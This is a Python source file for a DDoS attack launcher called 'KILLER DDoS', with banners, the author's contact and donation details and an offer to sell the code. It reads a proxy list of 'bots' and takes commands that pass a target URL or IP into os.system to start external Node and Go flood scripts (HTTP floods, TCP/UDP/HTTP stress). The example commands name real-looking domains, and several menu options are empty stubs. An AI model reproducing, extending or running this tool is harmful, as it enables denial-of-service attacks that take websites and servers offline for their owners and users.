
from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.RED + """
▓██ ▄█▀ █▓ ▓██▓    ▓██▓    ▓█████ ▓██▀███▓
▓██▄█▒ ▓██ ▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▓███▄░ ▒██ ▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
▓██ █▄ ░██ ▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ █▄░██ ░██████ ░██████ ░▒████ ░██▓ ▒██▒
▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
░  ░    ░      ░  ░    ░  ░   ░  ░   ░      by NgThanhVinh
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0927423139")
    print("Information: https://NgThanhVinh.info")

def menu():
    sys.stdout.write(f"KILLER DDoS Update 1.0.1")
    clear()
    print('KILLER DDoS By NgThanhVinh [NTV.info] ')
    print("https://NgThanhVinh.info")
    print(Fore.BLUE + """
 █████   ████  ███  ████  ████                    
░░███   ███░  ░░░  ░░███ ░░███                    
 ░███  ███    ████  ░███  ░███   ██████  ████████ 
 ░███████    ░░███  ░███  ░███  ███░░███░░███░░███
 ░███░░███    ░███  ░███  ░███ ░███████  ░███ ░░░ 
 ░███ ░░███   ░███  ░███  ░███ ░███░░░   ░███     
 █████ ░░████ █████ █████ █████░░██████  █████    
 ░░░░░   ░░░░ ░░░░░ ░░░░░ ░░░░░  ░░░░░░  ░░░░░  
      Mua source code LH: zalo.me/0927423139
             Donate : Momo: 0927423139
               MB Bank: 7922620599999
""")

def main():
    menu()
    while(True):
        cnc = input('''Input :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
                print(Fore.BLUE +'Example: http-socket http://TranDucDuy.info/ 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-raw <url> <time>')
                print(Fore.BLUE +'Example: http-raw TranDucDuy.info/ 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-requests <url> <time>')
                print(Fore.BLUE +'Example: http-requests http://TranDucDuy.info/ 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.BLUE +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.BLUE +'MODE: [1] TCP')
                print(Fore.BLUE +'      [2] UDP')
                print(Fore.BLUE +'      [3] HTTP')
                print(Fore.BLUE +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-rand <url> <time>')
                print(Fore.BLUE +'Example: http-rand http://TranDucDuy.info/ 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.BLUE +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.BLUE +'Example: sever http://TranDucDuy.info/ GET')

        elif "info" in cnc:
            print(f'''
[https://TranDucDuy.info]
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Command Đéo Có")
            except IndexError:
                pass
main()
